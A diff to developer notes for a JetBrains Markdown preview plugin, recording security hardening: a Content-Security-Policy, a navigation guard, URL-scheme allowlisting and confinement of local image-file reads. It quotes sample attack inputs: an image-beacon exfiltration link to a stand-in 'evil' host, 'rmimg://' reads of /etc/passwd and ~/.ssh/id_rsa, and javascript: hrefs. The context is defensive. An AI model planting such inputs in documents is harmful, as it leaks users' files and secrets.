@@ -286,15 +286,56 @@ Swift is `md.split('\n')` in the shipped `.js`. Verified by grepping for stray `
   percent-encodes the path (spaces → `%20`) and keeps `/` as separators; `URI(url).path` decodes it
   back. `EditorScript.jsonEncode` does *not* escape `/`, so the `rmimg://…` src reaches the page
   intact (matching the Mac app's `withoutEscapingSlashes`).
-- **SECURITY choice, for the security stage to weigh (documented per task):** unlike the sandboxed
-  Mac app (which served only user-granted folders), the plugin serves **any** file the resolved
-  `rmimg:` path names — a JetBrains plugin runs unsandboxed with the user's full FS rights, matching
-  how the IDE itself reads files. Hardening applied now is path hygiene only: `fileForImageUrl`
-  `normalize()`s the path (collapsing `..`) and the handler serves a file only if it `isFile &&
-  canRead()`, returning an empty 404 otherwise. There is **no** directory allow-list yet — a
-  malicious document could name `rmimg://local/etc/passwd` and the handler would stream it into an
-  `<img>` (from which bytes are not readable back by the page, but existence/size is observable). If
-  the security stage wants it, gate reads to the document's own directory subtree.
+- **URL build/parse parity note continued:** the `rmimg:` read path is now allow-listed — see the
+  security section below.
+
+## Security & Marketplace hardening (applied)
+
+Unlike the sandboxed Mac app (no network entitlement, user-granted folders only), a JetBrains plugin
+runs unsandboxed with the user's full network and filesystem rights, and its JCEF process can reach
+the network freely. A `.md` is untrusted input (it is the shared handoff artifact, and Claude writes
+into it), so the read pane needs its own fences. What was added:
+
+- **Content-Security-Policy in `web/shell.html`.** `default-src 'none'; script-src 'unsafe-inline'
+  'unsafe-eval'; style-src 'unsafe-inline'; img-src rmimg: data:; font-src data:;`. This is the
+  no-network guarantee the Mac app got from its sandbox. `img-src rmimg: data:` (no http/https) is
+  what closes the image-beacon exfiltration channel — a `![x](https://evil/leak?…)` in a document no
+  longer fires an outbound GET on preview. **`'unsafe-eval` is required**: the bundled mermaid uses
+  the `Function` constructor (26 sites; a global bump at load, plus d3/dagre), and without it every
+  diagram silently degrades. The mermaid/diagram bundles are injected via CEF `executeJavaScript`
+  (not governed by page CSP), but their **runtime** eval is — so the directive has to allow it.
+  `'unsafe-inline'` script is unavoidable anyway (`markerAnchors` emits inline `onclick`), so the CSP
+  is a network fence, not an anti-XSS fence; the anti-XSS work is done by the two items below.
+- **Navigation guard (`CefRequestHandlerAdapter.onBeforeBrowse`).** The shell loads once and
+  everything after is `executeJavaScript` into the live page, so the page has no business navigating.
+  A `[text](http…)` link would otherwise replace the whole preview with a remote page in-process, and
+  a `javascript:`/`data:` href would run script in the privileged page holding the `rmPost` bridge.
+  CSP **cannot** block a top-level `javascript:` navigation (script-src must stay `'unsafe-inline'`),
+  so the guard is required, not redundant. It cancels every navigation once loaded, routing genuine
+  http/https/mailto links to the system browser via `BrowserUtil.browse`. Mirrors the Mac edit
+  window's `decidePolicyFor`. Gate on the existing `loaded` flag so the initial shell load is allowed.
+- **URL-scheme allowlist in `markdown.js` (`safeHref`/`safeSrc`).** `escAttr` does HTML-attribute
+  escaping, NOT URL sanitization — `javascript:…` passes through it verbatim. So href/src schemes are
+  now allow-listed at render time (belt-and-braces to the CSP + guard); a disallowed scheme renders as
+  its literal source text instead of a live tag.
+- **`rmimg:` file-read confinement (`RmImgAccess` + `pathIsUnderRoot`).** The handler now reads a file
+  only if its **canonical** path (`File.canonicalFile`, which resolves `..` AND symlinks) sits under a
+  root registered by an open preview — the document's own folder and its `project.basePath`. That
+  blocks `rmimg://local/etc/passwd`, `~/.ssh/id_rsa`, other projects' source, and symlink escapes,
+  while still allowing the product's **sibling** `../images/web/photo.jpg` convention (both the doc and
+  the sibling folder live under the project root). Opened outside a project, only the doc's own folder
+  is trusted — the safe default. Reads are also capped at 64 MB so a document cannot force an OOM. The
+  pure containment decision is unit-tested (`RmImgAccessTest`); canonicalization runs against the real
+  FS in the handler. `EditorScript.fileForImageUrl` stays a pure URL→path map (still tested by
+  `ImageTest`); the security boundary lives in the handler, not in that map.
+- **Marketplace/plugin.xml compliance.** `untilBuild = provider { null }` leaves the upper
+  compatibility bound OPEN (the platform plugin otherwise defaults it to `242.*`, which would refuse
+  install on 2024.3+). `<name>` dropped "for JetBrains" (trademark rule). Added an original
+  `META-INF/pluginIcon.svg` (40×40, `viewBox 0 0 40 40`), `changeNotes` (patched in at build; provide
+  it WITHOUT a `<![CDATA[…]]>` wrapper — the patcher adds one, and a nested `]]>` fails
+  `patchPluginXml`), a `<vendor url>`, a Claude/Anthropic non-affiliation note, and a bundled-OSS
+  disclosure. Added top-level `LICENSE` (MIT) and `THIRD-PARTY-NOTICES.md` (Mermaid MIT, SnakeYAML
+  Apache-2.0). Bumped `snakeyaml` 2.3→2.6. Untracked `.DS_Store` and ignored it plus `.intellijPlatform/`.
 
 ## Commands cheat-sheet
 
